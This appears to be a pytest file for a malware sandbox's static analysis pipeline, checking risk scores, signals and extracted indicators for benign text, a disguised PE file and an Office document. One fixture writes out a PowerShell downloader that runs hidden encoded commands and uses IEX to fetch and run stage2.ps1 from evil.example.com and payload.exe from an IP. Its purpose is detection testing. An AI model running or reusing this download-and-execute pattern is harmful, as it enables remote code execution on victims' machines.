"""End-to-end static pipeline behaviour on representative samples.

Runs the orchestrator synchronously (``pipeline.run``) rather than through the
async runner, so each verdict is deterministic and there is nothing to poll. The
HTTP submit/poll path is exercised separately in ``test_api``.
"""
from __future__ import annotations

from app.engine import pipeline
from app.engine.models import JobSource, JobStatus, SandboxJob
from app.engine.storage import store_bytes


def _analyse(db, name: str, data: bytes) -> SandboxJob:
    stored = store_bytes(data)
    job = pipeline.new_job(db, stored, original_name=name, source=JobSource.UPLOAD)
    db.commit()
    pipeline.run(db, job)
    db.commit()
    return job


def _signal_ids(job: SandboxJob) -> set[str]:
    return {
        s["id"]
        for payload in (job.analysis or {}).values()
        if payload.get("ran")
        for s in payload.get("signals", [])
    }


def test_benign_text_is_low_risk(db):
    job = _analyse(
        db, "notes.txt", b"Meeting notes: buy milk, water the plants.\nNothing here.\n" * 4
    )
    assert job.status == JobStatus.COMPLETED
    assert job.risk_level == "low"
    assert job.final_score < 30
    # Even a clean sample records that the static tier ran and the dynamic did not.
    assert job.tiers["static"]["ran"] is True
    assert job.tiers["dynamic"]["ran"] is False


def test_powershell_downloader_is_high_risk(db):
    script = (
        b"powershell -NoProfile -w hidden -EncodedCommand aQBlAHgA\n"
        b"$c = New-Object Net.WebClient\n"
        b"IEX ($c.DownloadString('http://evil.example.com/stage2.ps1'))\n"
        b"$c.DownloadFile('http://185.100.87.202/payload.exe', 'C:\\Temp\\p.exe')\n"
        b"[Convert]::FromBase64String('QUJDREVGRw==')\n"
    )
    job = _analyse(db, "invoice_scan.ps1", script)

    assert job.status == JobStatus.COMPLETED
    assert job.family == "script"
    assert job.final_score >= 60
    assert job.risk_level in ("high", "critical")

    # The downloader's intent is spelled out in signals.
    ids = _signal_ids(job)
    assert "script.download_and_execute" in ids
    assert "script.dynamic_execution" in ids  # IEX

    # IOCs were lifted out of the sample as text.
    iocs = job.iocs
    assert "http://evil.example.com/stage2.ps1" in iocs["urls"]
    assert "evil.example.com" in iocs["domains"]
    assert "185.100.87.202" in iocs["ips"]

    # Static ran, dynamic did not — the verdict states its blind spot.
    assert job.tiers["static"]["ran"] is True
    assert job.tiers["dynamic"]["ran"] is False


def test_pe_content_under_a_document_name_is_flagged(db):
    # A minimal but structurally valid MZ/PE header, submitted as ".pdf".
    pe = b"MZ" + b"\x90" * 0x38 + (0x40).to_bytes(4, "little") + b"PE\x00\x00" + b"\x00" * 400
    job = _analyse(db, "invoice.pdf", pe)

    assert job.status == JobStatus.COMPLETED
    assert job.family == "pe"
    assert bool(job.extension_mismatch) is True
    # The content-vs-name lie is a high signal and lifts the sample out of "low".
    assert "generic.extension_mismatch" in _signal_ids(job)
    assert job.final_score >= 30
    assert job.risk_level in ("medium", "high", "critical")


def test_office_document_classifies_as_office_family(db):
    import io
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr(
            "[Content_Types].xml",
            "<?xml version='1.0'?><Types xmlns="
            "'http://schemas.openxmlformats.org/package/2006/content-types'/>",
        )
        zf.writestr(
            "word/document.xml",
            "<?xml version='1.0'?><w:document xmlns:w="
            "'http://schemas.openxmlformats.org/wordprocessingml/2006/main'><w:body/></w:document>",
        )
    job = _analyse(db, "report.docx", buf.getvalue())

    assert job.status == JobStatus.COMPLETED
    assert job.family == "office"
    # The office analyzer ran (an OOXML package is not unpacked as a plain archive).
    assert "office" in job.analysis
    assert job.analysis["office"]["ran"] is True
